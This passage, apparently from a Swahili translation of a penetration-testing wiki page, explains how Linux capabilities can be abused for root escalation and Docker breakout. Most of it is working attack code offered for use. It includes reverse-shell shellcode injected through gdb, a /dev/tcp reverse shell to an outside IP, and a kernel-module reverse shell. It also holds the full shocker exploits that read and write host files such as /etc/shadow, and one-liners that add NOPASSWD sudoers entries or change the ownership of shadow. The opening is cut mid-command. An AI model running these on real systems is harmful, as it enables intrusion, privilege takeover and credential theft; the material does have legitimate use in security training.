4. Mara tu programu inapopakia kwenye gdb, tumia amri ifuatayo kuingiza shellcode kwenye kumbukumbu:

   ```
   set {unsigned char *}0x<Anwani ya kumbukumbu> = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Chunguza kwa kina mchakato wa mizizi na gdb na nakili na ubandike mistari ya gdb iliyotengenezwa hapo awali:

```bash
$ gdb -p <pid>
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) catch exec
(gdb) run
```

```bash
$ gdb -p <pid>
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) catch exec
(gdb) run
```
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Mfano na mazingira (Docker breakout) - Matumizi mengine ya gdb**

Ikiwa **GDB** imefungwa (au unaweza kuifunga kwa kutumia `apk add gdb` au `apt install gdb` kwa mfano), unaweza **kudebugi mchakato kutoka kwenye mwenyeji** na kumfanya aite kazi ya `system`. (Mbinu hii pia inahitaji uwezo wa `SYS_ADMIN`).
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Hutaweza kuona matokeo ya amri iliyotekelezwa lakini itatekelezwa na mchakato huo (hivyo pata rev shell).

{% hint style="warning" %}
Ikiwa unapata kosa "Hakuna ishara "system" katika muktadha wa sasa." angalia mfano uliopita wa kupakia shellcode katika programu kupitia gdb.
{% endhint %}

**Mfano na mazingira (Docker breakout) - Uingizaji wa Shellcode**

Unaweza kuangalia uwezo uliowezeshwa ndani ya kontena ya docker kwa kutumia:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Orodhesha **mchakato** unaofanya kazi kwenye **mwenyeji** `ps -eaf`

1. Pata **usanifu** `uname -m`
2. Tafuta **shellcode** kwa usanifu ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Tafuta **programu** ya **kuingiza** **shellcode** kwenye kumbukumbu ya mchakato ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Badilisha** shellcode ndani ya programu na **itafsiri** `gcc inject.c -o inject`
5. **Ingiza** na pata **shell** yako: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** inawezesha mchakato kufanya **upakiaji na uondolewaji wa moduli za kernel (`init_module(2)`, `finit_module(2)` na `delete_module(2)` wito wa mfumo)**, ikitoa ufikiaji moja kwa moja kwa shughuli za msingi za kernel. Uwezo huu unaweka hatari kubwa ya usalama, kwani inawezesha kuongeza mamlaka na kuhatarisha mfumo mzima kwa kuruhusu mabadiliko kwenye kernel, hivyo kukiuka taratibu zote za usalama za Linux, ikiwa ni pamoja na Moduli za Usalama za Linux na kizuizi cha kontena.
**Hii inamaanisha kuwa unaweza** **kuweka/kuondoa moduli za kernel kwenye mashine ya mwenyeji.**

**Mfano na binary**

Katika mfano ufuatao, binary **`python`** ina uwezo huu.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Kwa chaguo-msingi, amri ya **`modprobe`** inachunguza orodha ya utegemezi na faili za ramani katika saraka **`/lib/modules/$(uname -r)`**.\
Ili kutumia hili vibaya, hebu tujenge saraka bandia ya **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Kisha **kamilisha moduli ya kernel unaweza kupata mifano 2 hapa chini na nakili** kwenye folda hii:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Hatimaye, tekeleza msimbo wa python unaohitajika ili kupakia kifurushi hiki cha kernel:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Mfano 2 na binary**

Katika mfano ufuatao binary **`kmod`** ina uwezo huu.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Hii inamaanisha kwamba ni rahisi kutumia amri **`insmod`** kuweka moduli ya kernel. Fuata mfano hapa chini ili kupata **shell ya nyuma** kwa kutumia mamlaka haya.

**Mfano na mazingira (Docker breakout)**

Unaweza kuangalia uwezo uliowezeshwa ndani ya kontena ya docker kwa kutumia:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Ndani ya matokeo ya awali unaweza kuona kuwa uwezo wa **SYS\_MODULE** umewezeshwa.

**Tengeneza** **moduli ya kernel** ambayo itatekeleza kitanzi cha kurudisha na **Makefile** ya **kuikusanya**:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Neno tupu kabla ya kila neno la kufanya katika faili ya Kufanya **lazima iwe tab, sio nafasi**!
{% endhint %}

Tumia `fanya` ili kuikusanya.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Hatimaye, anza `nc` ndani ya kikao na **pakiwa moduli** kutoka kikao kingine na utapata kikao katika mchakato wa nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Msimbo wa mbinu hii ulichukuliwa kutoka kwenye maabara ya "Abusing SYS\_MODULE Capability" kutoka** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

Mfano mwingine wa mbinu hii unaweza kupatikana katika [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) inawezesha mchakato kukiuka ruhusa za kusoma faili na kusoma na kutekeleza saraka. Matumizi yake kuu ni kwa ajili ya utafutaji wa faili au kusoma. Walakini, pia inaruhusu mchakato kutumia kazi ya `open_by_handle_at(2)`, ambayo inaweza kupata faili yoyote, ikiwa ni pamoja na zile nje ya kipekee cha mchakato. Kipekee kinachotumiwa katika `open_by_handle_at(2)` kinapaswa kuwa kitambulisho kisichoweza kuonekana kupitia `name_to_handle_at(2)`, lakini inaweza kujumuisha habari nyeti kama nambari za inode ambazo zinaweza kudukuliwa. Uwezekano wa kutumia uwezo huu, haswa katika muktadha wa vyombo vya Docker, ulidhihirishwa na Sebastian Krahmer na shambulio la shocker, kama ilivyoainishwa [hapa](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Hii inamaanisha kuwa unaweza kukiuka ukaguzi wa ruhusa za kusoma faili na ukaguzi wa ruhusa za kusoma/utekelezaji wa saraka.**

**Mfano na faili ya binary**

Faili ya binary itaweza kusoma faili yoyote. Kwa hivyo, ikiwa faili kama tar ina uwezo huu, itaweza kusoma faili ya shadow:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Mfano na binary2**

Katika kesi hii, fikiria kuwa kuna uwezo huu kwenye binary ya **`python`**. Ili kuorodhesha faili za mizizi, unaweza kufanya yafuatayo:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Na ili kusoma faili unaweza kufanya:
```python
print(open("/etc/shadow", "r").read())
```
**Mfano katika Mazingira (Docker breakout)**

Unaweza kuangalia uwezo uliowezeshwa ndani ya kontena ya docker kwa kutumia:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Ndani ya matokeo ya awali unaweza kuona kuwa uwezo wa **DAC\_READ\_SEARCH** umewezeshwa. Kama matokeo, chombo kinaweza **kuchunguza michakato**.

Unaweza kujifunza jinsi mbinu ifuatayo inavyofanya kazi katika [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) lakini kwa muhtasari **CAP\_DAC\_READ\_SEARCH** sio tu inaturuhusu kupitia mfumo wa faili bila ukaguzi wa idhini, lakini pia inaondoa wazi ukaguzi wowote kwa _**open\_by\_handle\_at(2)**_ na **inaweza kuruhusu michakato yetu kufikia faili nyeti zilizofunguliwa na michakato mingine**.

Mbinu ya awali ambayo inatumia uwezo huu kusoma faili kutoka kwenye mwenyeji inaweza kupatikana hapa: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), ifuatayo ni **toleo lililobadilishwa ambalo linakuwezesha kuonyesha faili unayotaka kusoma kama hoja ya kwanza na kuiweka kwenye faili.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
Exploit hii inahitaji kupata pointer kwa kitu kilichomount kwenye mwenyeji. Exploit ya awali ilikuwa inatumia faili /.dockerinit na toleo lililobadilishwa linatumia /etc/hostname. Ikiwa exploit haifanyi kazi, labda unahitaji kuweka faili tofauti. Ili kupata faili ambayo imemount kwenye mwenyeji, tuendeshe amri ya mount:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**Msimbo wa mbinu hii ulichukuliwa kutoka kwenye maabara ya "Abusing DAC\_READ\_SEARCH Capability" kutoka** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) ni tukio muhimu zaidi la usalama wa mtandao nchini **Spain** na moja ya muhimu zaidi barani **Ulaya**. Kwa **kukuza maarifa ya kiufundi**, mkutano huu ni mahali pa kukutana kwa wataalamu wa teknolojia na usalama wa mtandao katika kila fani.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**Hii inamaanisha kuwa unaweza kuepuka ukaguzi wa ruhusa ya kuandika kwenye faili yoyote, hivyo unaweza kuandika faili yoyote.**

Kuna faili nyingi unazoweza **kuandika upya ili kuongeza mamlaka,** [**unaweza kupata wazo kutoka hapa**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Mfano na binary**

Katika mfano huu, vim ina uwezo huu, hivyo unaweza kubadilisha faili yoyote kama _passwd_, _sudoers_ au _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Mfano na faili ya 2**

Katika mfano huu, faili ya **`python`** itakuwa na uwezo huu. Unaweza kutumia python kubadilisha faili yoyote:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Mfano na mazingira + CAP_DAC_READ_SEARCH (Docker breakout)**

Unaweza kuangalia uwezo uliowezeshwa ndani ya chombo cha docker kwa kutumia:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Kwanza soma sehemu iliyotangulia ambayo [**inatumia uwezo wa DAC\_READ\_SEARCH kusoma faili za aina yoyote**](linux-capabilities.md#cap\_dac\_read\_search) ya mwenyeji na **kuchakata** shambulio.\
Kisha, **chakata toleo lifuatalo la shambulio la shocker** ambalo litakuruhusu **kuandika faili za aina yoyote** ndani ya mfumo wa faili wa mwenyeji:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Ili kutoroka kwenye kontena ya docker unaweza **kupakua** faili `/etc/shadow` na `/etc/passwd` kutoka kwenye mwenyeji, **kuongeza** mtumiaji **mpya**, na kutumia **`shocker_write`** kuwafuta. Kisha, **fikia** kupitia **ssh**.

**Msimbo wa mbinu hii ulichukuliwa kutoka kwenye maabara ya "Abusing DAC\_OVERRIDE Capability" kutoka** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**Hii inamaanisha kuwa niwezekana kubadilisha umiliki wa faili yoyote.**

**Mfano na binary**

Tuchukulie kuwa binary ya **`python`** ina uwezo huu, unaweza **kubadilisha** **umiliki** wa faili ya **shadow**, **kubadilisha nenosiri la root**, na kuongeza mamlaka:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Au na **`ruby`** binary ikiwa na uwezo huu:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**Hii inamaanisha kwamba niwezekana kubadilisha ruhusa ya faili yoyote.**

**Mfano na binary**

Ikiwa python ina uwezo huu, unaweza kubadilisha ruhusa ya faili ya kivuli, **kubadilisha nenosiri la root**, na kuongeza mamlaka:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**Hii inamaanisha kwamba ni rahisi kuweka kitambulisho cha mtumiaji kinachotumika kwenye mchakato ulioundwa.**

**Mfano na faili ya binary**

Ikiwa python ina **uwezo** huu, unaweza kuitumia kwa urahisi kuongeza mamlaka hadi kwenye akaunti ya msimamizi (root):
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Njia nyingine:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**Hii inamaanisha kwamba niwezekana kuweka kitambulisho cha kikundi cha mchakato ulioundwa.**

Kuna faili nyingi unaweza **kubadilisha ili kuongeza mamlaka,** [**unaweza kupata wazo hapa**](payloads-to-execute.md#kubadilisha-faili-ili-kuongeza-mamlaka).

**Mfano na binary**

Katika kesi hii, unapaswa kutafuta faili za kuvutia ambazo kikundi kinaweza kusoma kwa sababu unaweza kujifanya kuwa kikundi chochote:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Marafiki, mara tu utakapopata faili ambayo unaweza kuitumia (kwa kusoma au kuandika) ili kuongeza mamlaka, unaweza **kupata kifaa cha kuingia kwa kujifanya kama kikundi kinachovutia** kwa kutumia:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Katika kesi hii, kikundi cha shadow kilijifanya ili uweze kusoma faili `/etc/shadow`:
```bash
cat /etc/shadow
```
Ikiwa **docker** imefungwa, unaweza **kujifanya** kama **kikundi cha docker** na kuitumia vibaya kuwasiliana na [**socket ya docker** na kuongeza mamlaka](./#writable-docker-socket).

## CAP\_SETFCAP

**Hii inamaanisha kuwa ni rahisi kuweka uwezo kwenye faili na michakato**

**Mfano na faili ya binary**

Ikiwa python ina **uwezo** huu, unaweza kuitumia kwa urahisi kuongeza mamlaka hadi kwa mtumiaji mkuu:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
Tafadhali kumbuka kuwa ikiwa unaweka uwezo mpya kwa faili ya CAP\_SETFCAP, utapoteza uwezo huu.
{% endhint %}

Marafiki wakati unaweka [uwezo wa SETUID](linux-capabilities.md#cap\_setuid) kwenye faili, unaweza kwenda kwenye sehemu yake kuona jinsi ya kuongeza mamlaka.

**Mfano na mazingira (Docker breakout)**

Kwa chaguo-msingi, uwezo wa **CAP\_SETFCAP unapewa kwa mchakato ndani ya kontena kwenye Docker**. Unaweza kuthibitisha hilo kwa kufanya kitu kama:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
